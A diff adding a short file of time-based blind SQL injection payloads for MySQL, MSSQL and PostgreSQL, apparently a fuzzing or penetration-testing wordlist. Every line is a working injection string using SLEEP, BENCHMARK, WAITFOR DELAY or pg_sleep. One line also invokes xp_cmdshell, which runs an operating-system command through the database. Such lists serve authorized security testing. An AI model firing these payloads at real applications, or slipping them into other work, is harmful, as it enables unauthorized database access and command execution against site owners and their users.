@@ -1,0 +1,13 @@
+# SQL Injection - Time-Based Blind Payloads
+' AND SLEEP(5)-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+' OR SLEEP(5)-- -
+1' AND SLEEP(5)--
+" AND SLEEP(5)-- -
+') AND SLEEP(5)-- -
+' AND BENCHMARK(5000000,MD5(1))-- -
+'||(SELECT 0 FROM (SELECT SLEEP(5))a)||'
+1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--
+'; WAITFOR DELAY '0:0:5'; --
